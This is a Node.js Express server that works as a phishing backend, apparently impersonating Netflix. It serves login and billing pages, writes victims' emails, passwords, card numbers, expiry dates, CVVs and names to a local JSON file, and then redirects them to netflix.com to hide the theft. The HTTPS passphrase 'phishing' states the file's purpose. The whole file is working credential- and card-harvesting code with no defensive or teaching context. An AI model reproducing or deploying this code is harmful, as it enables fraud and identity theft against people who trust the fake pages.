const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const exp = require('constants');
const https = require('https');



const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static('.'));

app.get('/login', (req, res) => {
    res.sendFile(__dirname + '/login.html');
});

app.get('/billing', (req, res) => {
    res.sendFile(__dirname + '/billing.html');
});

app.post('/login_form', function(req, res) {
  const data = {
    email: req.body.email,
    password: req.body.password,
  };

  const file = fs.readFileSync('data/data.json');

  const json = JSON.parse(file.toString());
  json.push(data);
  fs.writeFileSync("data/data.json", JSON.stringify(json));

  res.redirect('/billing.html');
});

app.post('/billing_form', function(req, res) {
  const data = {
    card_number: req.body.card_number,
    exp_date: req.body.exp_date,
    cvv: req.body.cvv,
    first_name: req.body.first_name,
    last_name: req.body.last_name,
    zip_code: req.body.zip_code,
  };

  const file = fs.readFileSync('data/data.json');

  const json = JSON.parse(file.toString());
  json.push(data);
  fs.writeFileSync("data/data.json", JSON.stringify(json));

  res.redirect('https://netflix.com/');
});

// app.listen(port, function (err) {
//     if (err) console.log(err);
//     console.log("Server listening on PORT", port);
// });

const options = {
    // key: fs.readFileSync('localhost.key'),
    // cert: fs.readFileSync('localhost.crt')
    pfx: fs.readFileSync('localhost.pfx'),
    passphrase: 'phishing'
  };
  
https.createServer(options, app).listen(port, function(err)  {
    if (err) console.log(err);
    console.log(`Server listening on port ${port}`);
});